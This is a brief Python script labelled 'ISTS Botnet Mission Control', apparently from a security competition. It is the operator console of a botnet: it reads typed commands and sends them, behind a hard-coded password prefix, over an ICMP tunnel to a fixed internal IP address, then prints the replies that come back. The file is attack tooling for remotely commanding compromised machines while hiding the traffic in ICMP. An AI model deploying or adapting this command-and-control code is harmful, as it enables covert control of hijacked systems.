from icmp_tunnel import *
import sys
import Queue

responseQueue = Queue.Queue()

def main():
	listener = Listener(responseQueue)
	print(" - ISTS Botnet Mission Control - ")
    	print("\thelp - to list commands")
	while True:
		if not responseQueue.empty():
			print(responseQueue.get())

   		sys.stdout.write(">>>")
		cmd = raw_input("")
		send_icmp(localhost, "10.80.100.14", "OkayNowYouCanUseMe"+cmd)
		
if __name__ == "__main__":
    main()
